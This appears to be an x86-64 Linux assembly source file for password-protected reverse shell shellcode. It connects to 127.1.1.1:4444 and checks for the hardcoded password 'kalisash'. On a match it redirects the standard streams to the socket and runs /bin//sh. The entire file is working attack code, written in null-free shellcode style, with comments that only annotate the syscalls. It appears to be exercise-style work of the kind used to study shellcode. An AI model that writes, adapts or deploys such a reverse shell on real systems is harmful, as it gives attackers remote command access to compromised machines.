

global _start

section .text

_start:
	jmp real_start
    enter_password: db 'Enter your password: ', 0xa

real_start:
; syscall: socket --> open a socket
; int socket(int domain, int type, int protocol);

	xor rax,rax
	add al, 0x29 ;41:syscall number
	xor rdi,rdi
	add rdi,0x2 ;2:AF_INET
	xor rsi,rsi
	inc rsi		;1:SOCK_STREAM
	xor rdx,rdx ;0:INADDR_ANY
	syscall

	mov r15,rax  ;for future usage

; syscall connect()
; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen); 
; 42 (rdi), ... (rsi) , 16(rdx)
	push 0x2a
	pop rax ; 42:syscall connect
	mov rdi, r15   ;move it back to rdi
	push rdx
	push rdx
	push 0x0101017f ; 127.1.1.1:IP
	push word 0x5C11 ; 4444:port
	push word 0x02 ; 2:AF_INET
	mov rsi, rsp
	add rdx, 0x10 ; 16:address lenght
	syscall

; syscall read()
;ssize_t read(int fd, void *buf, size_t count);
; rdi, rsi, rdx
 
    xor rax, rax 
    mov rdi, r15    ;move it back to rdi  
    sub rsp, 0x1e
    mov rsi, rsp    ;allocate space in stack
    mov dl, 0x1e  
    syscall
  
    mov rax, 0x68736173696c616b ; little endian "kalisash"
    mov rdi, rsi                ; password is in rdi now
    scasq                       ; compare rax with rdi:password
    jne end                     ;when password is wrong, go to end


; syscall dup2()
 
	push 0x02
	pop rsi         ;rsi's 2 now
	mov rdi, r15    ;back to rdi
	 
	loop:
		push 0x21   ;33:syscall dup2
		pop rax   
		syscall
		dec rsi ; decrement fd
		jns loop


;syscalls.execve

	  xor rax, rax        
    add rax, 59

    xor r9, r9
    push r9

    mov rbx, 0x68732f6e69622f2f	;/bin//sh in reverse
    push rbx 

    mov rdi, rsp
    push r9
    mov rdx, rsp

    push rdi
    mov  rsi, rsp
    syscall

;syscalls.close
	end:
	xor rax,rax
	add al,0x03 ;3:syscall close
	syscall

	xor rax,rax
	add al,0x3C ;60:syscall exit
	syscall
    	    
